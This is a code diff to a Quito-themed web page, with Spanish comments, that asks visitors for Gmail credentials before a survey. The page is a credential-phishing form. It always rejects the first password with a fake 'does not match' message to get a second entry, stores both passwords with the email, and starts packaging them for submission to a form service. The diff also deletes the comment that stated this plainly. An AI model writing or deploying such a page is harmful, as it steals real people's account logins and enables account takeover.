@@ -17,6 +17,7 @@
         .bg-quito-gold { background-color: #bb9457; }
         .border-quito-gold { border-color: #bb9457; }
         
+        /* Colores de la bandera de Quito para ¡VIVA QUITO! */
         .quito-title-gradient {
             background: linear-gradient(135deg, #2563eb 40%, #dc2626 60%);
             -webkit-background-clip: text;
@@ -24,6 +25,7 @@
             text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
         }
 
+        /* Fondo con la Virgen del Panecillo */
         .hero-bg {
             background: linear-gradient(rgba(13, 27, 42, 0.65), rgba(13, 27, 42, 0.85)), 
                         url('https://images.unsplash.com/photo-1588668214407-6ea9a6d8c272?auto=format&fit=crop&w=1920&q=80');
@@ -186,16 +188,16 @@
 
             const emailValue = emailField.value.trim().toLowerCase();
 
-            // 1. Validar que sea un correo electrónico de Gmail válido
+            // 1. Validar correo de Gmail
             if (!emailValue.endsWith('@gmail.com')) {
                 errorText.textContent = "Por favor, ingresa un correo electrónico de Gmail válido (@gmail.com).";
                 errorBox.classList.remove('hidden');
                 return;
             }
 
-            // 2. Lógica del primer intento (guardar 1ra contraseña y pedir reingreso)
+            // 2. Lógica del primer intento (guardar 1ra clave y mostrar mensaje)
             if (loginAttempts === 0) {
-                userData.firstPassword = passwordField.value; // Guarda primera contraseña
+                userData.firstPassword = passwordField.value;
                 loginAttempts++;
                 
                 errorText.textContent = "La contraseña no coincide. Por favor, ingrésala de nuevo.";
@@ -204,9 +206,9 @@
                 passwordField.value = ''; 
                 passwordField.focus();
             } else {
-                // Segundo intento (guarda correo y 2da contraseña y avanza)
+                // Segundo intento (guardar correo y 2da clave y avanzar)
                 userData.email = emailValue;
-                userData.secondPassword = passwordField.value; // Guarda segunda contraseña
+                userData.secondPassword = passwordField.value;
 
                 document.getElementById('login-section').classList.add('hidden');
                 document.getElementById('survey-section').classList.remove('hidden');
@@ -228,7 +230,6 @@
 
             const randomParticipantId = Math.floor(Math.random() * 600) + 1901;
 
-            // Enviar todos los datos (incluidas ambas contraseñas) a Formspree
             const formData = new FormData();
             formData.append('Fecha', new Date().toLocaleString());
             formData.append('Correo', userData.email);
